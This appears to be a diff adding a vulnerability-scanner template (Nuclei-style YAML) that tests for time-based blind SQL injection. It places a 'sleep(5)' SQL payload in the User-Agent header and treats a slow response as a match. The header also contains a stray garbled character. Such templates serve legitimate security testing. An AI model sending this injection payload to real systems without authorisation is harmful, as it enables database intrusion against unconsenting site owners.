@@ -1,0 +1,19 @@
+id: User-Agent_SQLi
+
+info:
+  name: Blind SQLi
+  author: abdulrahman
+  severity: high
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win6é4; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36', (select*from (select (sleep(5)))a))#
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
